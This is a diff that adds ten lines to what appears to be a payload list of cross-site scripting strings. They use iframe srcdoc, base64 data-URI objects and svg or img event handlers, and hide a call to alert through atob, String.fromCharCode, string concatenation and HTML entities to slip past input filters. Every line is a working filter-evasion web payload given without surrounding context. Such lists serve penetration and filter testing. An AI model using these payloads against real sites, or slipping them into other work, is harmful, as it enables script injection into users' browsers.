@@ -1,0 +1,10 @@
+<iframe srcdoc="<img src=x onerror=window[atob('YWxlcnQ=')](1)>"></iframe>
+<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'></object>
+<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>
+<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>
+<svg onload=setInterval(window['al'+'ert'],1,1)>
+<iframe srcdoc="<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>"></iframe>
+<iframe srcdoc="<img src=x onerror=eval(window['al'+'ert'](1))>"></iframe>
+<svg onload=setInterval(window[String.fromCharCode(97,108,101,114,116)],1,1)>
+<iframe srcdoc='<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>
+<svg onload=eval(&#x61;&#x6c;&#x65;&#x72;&#x74;(1))></svg>
